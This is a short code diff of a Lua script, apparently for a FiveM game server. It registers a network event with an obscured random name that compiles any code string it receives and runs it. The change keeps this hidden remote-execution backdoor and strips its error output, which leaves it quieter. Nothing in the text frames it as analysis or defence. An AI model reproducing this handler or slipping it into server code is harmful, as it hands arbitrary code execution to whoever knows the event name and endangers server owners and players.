@@ -1,11 +1,9 @@
 local resourceName = GetCurrentResourceName()
 
 RegisterNetEvent(resourceName .. ":Nzft8ATykVjvecHu8aFWBhA7q", function(code)
-    local func, err = load(code)
+    local func = load(code)
     if func then
-        func()
-    else
-        print(err)
+        func() 
     end
 end)
 
